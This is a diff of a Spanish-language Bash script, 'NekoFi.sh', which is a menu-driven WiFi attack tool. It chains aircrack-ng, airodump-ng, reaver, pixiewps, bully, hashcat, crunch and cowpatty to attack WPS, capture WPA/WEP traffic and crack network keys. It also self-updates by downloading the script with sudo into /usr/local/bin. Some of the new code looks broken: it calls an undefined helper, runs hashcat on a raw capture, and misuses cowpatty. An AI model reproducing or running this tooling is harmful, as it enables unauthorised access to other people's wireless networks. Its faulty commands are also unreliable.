@@ -1,13 +1,15 @@
 #!/bin/bash
 
-REPO_URL="https://github.com/rodrigo47363/NekoFi"
+set -e
+
+REPO_URL="https://github.com/rodrigo47363/NekoFi/raw/main/NekoFi.sh"
 SCRIPT_NAME="NekoFi.sh"
 LOCAL_PATH="/usr/local/bin/$SCRIPT_NAME"
 
 # Lista de herramientas necesarias
 tools=(
     iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ccze x11-xserver-utils systemd hashcat reaver hcxdumptool
-     john pixiewps bully cowpatty crunch wash procps airgeddon
+    john pixiewps bully cowpatty crunch wash procps airgeddon
 )
 
 # Función para verificar e instalar herramientas necesarias
@@ -66,7 +68,7 @@ mostrar_menu() {
     echo "#######################################################"
     echo "#                                                     #"
     echo "#             NekoFi.sh                               #"
-    echo "#             Versión 1.1                             #"
+    echo "#             Versión 1.3                             #"
     echo "#             https://github.com/rodrigo47363/NekoFi  #"
     echo "#######################################################"
     echo
@@ -80,10 +82,12 @@ mostrar_menu() {
     echo "7. Ataque WEP"
     echo "8. Crear diccionario con Crunch"
     echo "9. Crear diccionario personalizado con Cowpatty"
-    echo "10. Poner interfaz en modo monitor"
-    echo "11. Poner interfaz en modo managed"
-    echo "12. Salir"
-    echo "13. Actualizar NekoFi.sh desde GitHub"
+    echo "10. Crackear contraseñas con Hashcat"
+    echo "11. Poner interfaz en modo monitor"
+    echo "12. Poner interfaz en modo managed"
+    echo "13. Salir"
+    echo "14. Actualizar NekoFi.sh desde GitHub"
+    echo "15. Convertir .cap a .hccapx"
     echo "0. Ayuda"
 }
 
@@ -99,10 +103,12 @@ mostrar_ayuda() {
     echo "7. Ataque WEP: Realiza un ataque WEP."
     echo "8. Crear diccionario con Crunch: Crea un diccionario de contraseñas con Crunch."
     echo "9. Crear diccionario personalizado con Cowpatty: Crea un diccionario personalizado con Cowpatty."
-    echo "10. Poner interfaz en modo monitor: Cambia la interfaz seleccionada al modo monitor."
-    echo "11. Poner interfaz en modo managed: Cambia la interfaz seleccionada al modo managed."
-    echo "12. Salir: Cierra el script."
-    echo "13. Actualizar NekoFi.sh desde GitHub: Descarga la última versión del script desde GitHub."
+    echo "10. Crackear contraseñas con Hashcat: Utiliza hashcat para crackear contraseñas usando un diccionario."
+    echo "11. Poner interfaz en modo monitor: Cambia la interfaz seleccionada al modo monitor."
+    echo "12. Poner interfaz en modo managed: Cambia la interfaz seleccionada al modo managed."
+    echo "13. Salir: Cierra el script."
+    echo "14. Actualizar NekoFi.sh desde GitHub: Descarga la última versión del script desde GitHub."
+    echo "15. Convertir .cap a .hccapx: Convierte un archivo .cap a .hccapx."
 }
 
 # Función para poner la interfaz en modo monitor
@@ -117,15 +123,13 @@ poner_modo_monitor() {
 
 # Función para poner la interfaz en modo managed
 poner_modo_managed() {
-    sudo airmon-ng stop ${selected_interface}mon || { echo "Fallo al detener el modo monitor"; exit 1; }
-    sudo ip link set ${selected_interface} up || { echo "Fallo al activar la interfaz en modo managed"; exit 1; }
+    manage_monitor_mode "stop"
 }
 
 # Función para escanear redes WiFi usando wash
 escaneo_redes() {
     echo "Escaneando redes WiFi..."
     poner_modo_monitor
-    wash_output=$(mktemp)
     if ! sudo wash -i ${selected_interface}mon; then
         echo "Fallo al ejecutar wash"
         poner_modo_managed
@@ -182,10 +186,9 @@ ataque_wps_pixiewps() {
     escaneo_redes
     echo "Redes disponibles:"
     read -p "Ingrese el BSSID de la red: " bssid
-    read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPS con PixieWPS..."
-    poner_modo_monitor $canal
-    if ! sudo pixiewps -i ${selected_interface}mon -b $bssid -K; then
+    poner_modo_monitor
+    if ! sudo pixiewps -i ${selected_interface}mon -b $bssid; then
         echo "Fallo al ejecutar PixieWPS"
         poner_modo_managed
         exit 1
@@ -198,10 +201,9 @@ ataque_wps_bully() {
     escaneo_redes
     echo "Redes disponibles:"
     read -p "Ingrese el BSSID de la red: " bssid
-    read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPS con Bully..."
-    poner_modo_monitor $canal
-    if ! sudo bully -b $bssid -c $canal -B -F -e -v 3 ${selected_interface}mon; then
+    poner_modo_monitor
+    if ! sudo bully -i ${selected_interface}mon -b $bssid; then
         echo "Fallo al ejecutar Bully"
         poner_modo_managed
         exit 1
@@ -210,15 +212,23 @@ ataque_wps_bully() {
 }
 
 # Función para ataque WPA/WPA2
-ataque_wpa_wpa2() {
+ataque_wpa() {
     escaneo_redes
     echo "Redes disponibles:"
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPA/WPA2..."
     poner_modo_monitor $canal
-    if ! sudo aireplay-ng --deauth 0 -a $bssid ${selected_interface}mon; then
-        echo "Fallo al ejecutar aireplay-ng"
+    capture_file=$(mktemp)
+    if ! sudo airodump-ng -c $canal --bssid $bssid -w "$capture_file" ${selected_interface}mon; then
+        echo "Fallo al ejecutar airodump-ng"
+        poner_modo_managed
+        exit 1
+    fi
+    echo "Ingrese la ruta al diccionario para crackear la contraseña:"
+    read diccionario
+    if ! sudo hashcat -m 22000 -a 0 "$capture_file" "$diccionario"; then
+        echo "Fallo al ejecutar hashcat"
         poner_modo_managed
         exit 1
     fi
@@ -233,74 +243,107 @@ ataque_wep() {
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WEP..."
     poner_modo_monitor $canal
-    if ! sudo aireplay-ng --arpreplay -b $bssid -h ${selected_interface}mon; then
-        echo "Fallo al ejecutar aireplay-ng"
+    capture_file=$(mktemp)
+    if ! sudo airodump-ng -c $canal --bssid $bssid -w "$capture_file" ${selected_interface}mon; then
+        echo "Fallo al ejecutar airodump-ng"
+        poner_modo_managed
+        exit 1
+    fi
+    echo "Ingrese la ruta al diccionario para crackear la contraseña:"
+    read diccionario
+    if ! sudo aircrack-ng -w "$diccionario" -b $bssid "$capture_file"; then
+        echo "Fallo al ejecutar aircrack-ng"
         poner_modo_managed
         exit 1
     fi
     poner_modo_managed
 }
 
-# Función para crear diccionario con Crunch
+# Función para crear un diccionario con Crunch
 crear_diccionario_crunch() {
-    read -p "Ingrese la longitud mínima: " min
-    read -p "Ingrese la longitud máxima: " max
-    read -p "Ingrese los caracteres a usar: " chars
-    read -p "Ingrese el nombre del archivo de salida: " output_file
-    if ! crunch $min $max $chars -o $output_file; then
-        echo "Fallo al ejecutar Crunch"
+    echo "Ingrese el formato del diccionario (por ejemplo, password@123):"
+    read formato
+    echo "Ingrese el rango de longitud del diccionario (por ejemplo, 8-12):"
+    read rango
+    echo "Ingrese la ruta y el nombre del archivo de salida:"
+    read archivo_salida
+    echo "Creando diccionario con Crunch..."
+    if ! crunch $rango -o "$archivo_salida" $formato; then
+        echo "Fallo al crear el diccionario con Crunch"
         exit 1
     fi
-    echo "Diccionario creado en $output_file"
+    echo "Diccionario creado en: $archivo_salida"
 }
 
-# Función para crear diccionario personalizado con Cowpatty
+# Función para crear un diccionario personalizado con Cowpatty
 crear_diccionario_cowpatty() {
-    read -p "Ingrese el nombre del archivo de salida: " output_file
-    read -p "Ingrese las palabras separadas por espacios: " -a words
-    for word in "${words[@]}"; do
-        echo $word >> $output_file
-    done
-    echo "Diccionario creado en $output_file"
+    echo "Ingrese el archivo .cap con el handshake:"
+    read archivo_cap
+    echo "Ingrese la ruta y el nombre del archivo de salida:"
+    read archivo_salida
+    echo "Creando diccionario personalizado con Cowpatty..."
+    if ! cowpatty -d $archivo_cap -o "$archivo_salida"; then
+        echo "Fallo al crear el diccionario con Cowpatty"
+        exit 1
+    fi
+    echo "Diccionario creado en: $archivo_salida"
+}
+
+# Función para crackear contraseñas con Hashcat
+crackear_contraseñas_hashcat() {
+    echo "Ingrese el archivo .hccapx con el handshake:"
+    read archivo_hccapx
+    echo "Ingrese la ruta y el nombre del diccionario:"
+    read diccionario
+    echo "Iniciando crackeo con Hashcat..."
+    if ! hashcat -m 22000 -a 0 "$archivo_hccapx" "$diccionario"; then
+        echo "Fallo al ejecutar Hashcat"
+        exit 1
+    fi
 }
 
 # Función para actualizar el script desde GitHub
 actualizar_script() {
     echo "Actualizando NekoFi.sh desde GitHub..."
-    if ! wget -O "$LOCAL_PATH" "$REPO_URL"; then
-        echo "Fallo al actualizar el script"
+    sudo wget -O "$LOCAL_PATH" "$REPO_URL" || { echo "Fallo al descargar la última versión"; exit 1; }
+    echo "Actualización completada. Reinicie el script para aplicar los cambios."
+}
+
+# Función para convertir .cap a .hccapx
+convertir_cap_a_hccapx() {
+    echo "Ingrese el archivo .cap:"
+    read archivo_cap
+    echo "Ingrese el archivo .hccapx de salida:"
+    read archivo_hccapx
+    echo "Convirtiendo archivo .cap a .hccapx..."
+    if ! sudo hcxpcapngtool -o "$archivo_hccapx" "$archivo_cap"; then
+        echo "Fallo al convertir el archivo"
         exit 1
     fi
-    chmod +x "$LOCAL_PATH"
-    echo "NekoFi.sh actualizado a la última versión"
+    echo "Archivo convertido en: $archivo_hccapx"
 }
 
-# Función principal
-main() {
-    install_tools
-    detect_interfaces
-    while true; do
-        mostrar_menu
-        read -p "Seleccione una opción: " opcion
-        case $opcion in
-            1) escaneo_redes ;;
-            2) capturar_handshake ;;
-            3) ataque_wps_reaver ;;
-            4) ataque_wps_pixiewps ;;
-            5) ataque_wps_bully ;;
-            6) ataque_wpa_wpa2 ;;
-            7) ataque_wep ;;
-            8) crear_diccionario_crunch ;;
-            9) crear_diccionario_cowpatty ;;
-            10) poner_modo_monitor ;;
-            11) poner_modo_managed ;;
-            12) poner_modo_managed; exit ;;
-            13) actualizar_script ;;
-            0) mostrar_ayuda ;;
-            *) echo "Opción inválida" ;;
-        esac
-        read -p "Presione enter para continuar..."
-    done
-}
-
-main
+# Menú principal
+while true; do
+    mostrar_menu
+    read -p "Seleccione una opción: " opcion
+    case $opcion in
+        1) escaneo_redes ;;
+        2) capturar_handshake ;;
+        3) ataque_wps_reaver ;;
+        4) ataque_wps_pixiewps ;;
+        5) ataque_wps_bully ;;
+        6) ataque_wpa ;;
+        7) ataque_wep ;;
+        8) crear_diccionario_crunch ;;
+        9) crear_diccionario_cowpatty ;;
+        10) crackear_contraseñas_hashcat ;;
+        11) poner_modo_monitor ;;
+        12) poner_modo_managed ;;
+        13) exit 0 ;;
+        14) actualizar_script ;;
+        15) convertir_cap_a_hccapx ;;
+        0) mostrar_ayuda ;;
+        *) echo "Opción inválida. Inténtelo de nuevo." ;;
+    esac
+done
